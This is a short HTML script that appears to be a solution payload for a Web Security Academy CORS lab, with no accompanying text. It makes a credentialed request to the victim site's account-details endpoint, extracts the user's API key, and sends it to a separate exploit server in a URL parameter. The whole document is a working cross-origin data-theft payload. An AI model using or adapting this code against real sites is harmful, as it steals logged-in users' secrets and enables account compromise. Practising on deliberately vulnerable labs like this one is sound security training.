<script>
function getAccountDetails(){
    var xhr = new XMLHttpRequest();
    xhr.withCredentials = true;
    xhr.onreadystatechange = function() {
    if (xhr.readyState == XMLHttpRequest.DONE) {
            var accountDetails = xhr.responseText;
            const accountDetailsJSON = JSON.parse(accountDetails);
            sendAPIKey(accountDetailsJSON.apikey);
        }
    }
    xhr.open('GET', 'https://accb1fd51f12cd1cc00efedd007800a0.web-security-academy.net/accountDetails', true);
    xhr.send(null);
}

function sendAPIKey(apiKey){
    console.log(apiKey);
    var xhr = new XMLHttpRequest();
    var params = '?apikey='+apiKey;
    xhr.onreadystatechange = function() {
    if (xhr.readyState == XMLHttpRequest.DONE) {
        }
    }
    xhr.open('GET', 'https://exploit-ac9c1f2d1fa8cd12c03dfed8018500ed.web-security-academy.net/'+params, true);
    xhr.send(null);
}

getAccountDetails()
</script>